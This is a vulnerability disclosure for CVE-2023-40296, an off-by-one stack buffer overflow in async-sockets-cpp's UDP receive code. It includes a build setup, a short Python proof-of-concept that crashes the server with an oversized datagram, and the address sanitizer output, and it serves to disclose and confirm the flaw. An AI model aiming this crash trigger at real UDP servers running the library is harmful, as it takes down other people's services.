# CVE-2023-40296
async-sockets-cpp (through 0.3.1) contains an off-by-one buffer overflow vulnerability in static void ReceiveFrom(UDPSocket* udpSocket) at udpsocket.hpp, around lines 160-167.  The buffer overflow affects all corresponding UDP servers.  The remote buffer overflow can be triggered by connecting to a UDP socket and sending a large buffer of bytes.

https://github.com/eminfedar/async-sockets-cpp/blob/d66588d3bc6fe26f27ab2093f8105191723a983d/async-sockets/include/udpsocket.hpp#L160-L167

To confirm the issue, I first compiled the example UDP server from the async-sockets-cpp/examples folder with debug symbols and address sanitizer:

### Makefile
```
CC		:= g++
CFLAGS	:= --std=c++11 -Wall -Wextra -Werror=conversion -fsanitize=address -g
LIBS	:= -lpthread -fsanitize=address
INC		:= ../async-sockets/include
RM		:= rm

.PHONY: all clean

all: tcp-client tcp-server udp-client udp-server

tcp-client: tcp-client.cpp $(INC)/tcpsocket.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

tcp-server: tcp-server.cpp $(INC)/tcpserver.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

udp-client: udp-client.cpp $(INC)/udpsocket.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

udp-server: udp-server.cpp $(INC)/udpserver.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

clean:
	$(RM) tcp-client
	$(RM) tcp-server
	$(RM) udp-client
	$(RM) udp-server
```

### Compilation

```
$ make
```

Once the server was compiled, I executed the udp-server on port 8888:

```
$ ./udp-server
```

I then created a python3 script to connect to the udp-server and send a large packet with around 4096 (or larger) bytes of content:

```
import socket

host = "localhost"
port = 8888                   # The same port as used by the server
buf = b'A'*10000               # Overflow happens at 4095 bytes

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, port))
    s.sendall(buf)
    data = s.recv(1024)
    s.close()
    print('Received', repr(data))
except:
    print("Completed...")
```

Executing the above python3 script will result in the server/thread crashing and producing the following detailed output from address sanitizer showing the location of the stack buffer overflow:

### ASAN Output

```
=================================================================
==352142==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f613a200120 at pc 0x55b71fc37288 bp 0x7f613adfdba0 sp 0x7f613adfdb98
WRITE of size 1 at 0x7f613a200120 thread T1
    #0 0x55b71fc37287 in UDPSocket<(unsigned short)4096>::ReceiveFrom(UDPSocket<(unsigned short)4096>*) ../async-sockets/include/udpsocket.hpp:162
    #1 0x55b71fc3a309 in void std::__invoke_impl<void, void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*>(std::__invoke_other, void (*&&)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*&&) /usr/include/c++/12/bits/invoke.h:61
    #2 0x55b71fc3a24c in std::__invoke_result<void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*>::type std::__invoke<void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*>(void (*&&)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*&&) /usr/include/c++/12/bits/invoke.h:96
    #3 0x55b71fc3a1bc in void std::thread::_Invoker<std::tuple<void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*> >::_M_invoke<0ul, 1ul>(std::_Index_tuple<0ul, 1ul>) /usr/include/c++/12/bits/std_thread.h:279
    #4 0x55b71fc3a175 in std::thread::_Invoker<std::tuple<void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*> >::operator()() /usr/include/c++/12/bits/std_thread.h:286
    #5 0x55b71fc3a159 in std::thread::_State_impl<std::thread::_Invoker<std::tuple<void (*)(UDPSocket<(unsigned short)4096>*), UDPSocket<(unsigned short)4096>*> > >::_M_run() /usr/include/c++/12/bits/std_thread.h:231
    #6 0x7f613dedc482  (/lib/x86_64-linux-gnu/libstdc++.so.6+0xdc482) (BuildId: 8ce98760d7c54203c5d99ee3bdd9fbca8e275529)
    #7 0x7f613dca63eb in start_thread nptl/pthread_create.c:444
    #8 0x7f613dd26a1b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

Address 0x7f613a200120 is located in stack of thread T1 at offset 4384 in frame
    #0 0x55b71fc3712e in UDPSocket<(unsigned short)4096>::ReceiveFrom(UDPSocket<(unsigned short)4096>*) ../async-sockets/include/udpsocket.hpp:152

  This frame has 7 object(s):
    [32, 33) '<unknown>'
    [48, 52) 'hostAddrSize' (line 155)
    [64, 80) 'hostAddr' (line 154)
    [96, 128) '<unknown>'
    [160, 192) '<unknown>'
    [224, 256) '<unknown>'
    [288, 4384) 'tempBuffer' (line 157) <== Memory access at offset 4384 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
Thread T1 created by T0 here:
    #0 0x7f613e247c36 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:208
    #1 0x7f613dedc558 in std::thread::_M_start_thread(std::unique_ptr<std::thread::_State, std::default_delete<std::thread::_State> >, void (*)()) (/lib/x86_64-linux-gnu/libstdc++.so.6+0xdc558) (BuildId: 8ce98760d7c54203c5d99ee3bdd9fbca8e275529)
    #2 0x55b71fc35e83 in UDPSocket<(unsigned short)4096>::UDPSocket(bool, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>, int) ../async-sockets/include/udpsocket.hpp:23
    #3 0x55b71fc35792 in UDPServer<(unsigned short)4096>::UDPServer() ../async-sockets/include/udpserver.hpp:7
    #4 0x55b71fc338c6 in main /home/kali/projects/fuzzing/async-sockets-cpp/examples/udp-server.cpp:9
    #5 0x7f613dc456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: stack-buffer-overflow ../async-sockets/include/udpsocket.hpp:162 in UDPSocket<(unsigned short)4096>::ReceiveFrom(UDPSocket<(unsigned short)4096>*)
Shadow bytes around the buggy address:
  0x7f613a1ffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a1fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a1fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7f613a200100: 00 00 00 00[f3]f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
  0x7f613a200180: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f613a200380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==352142==ABORTING


```

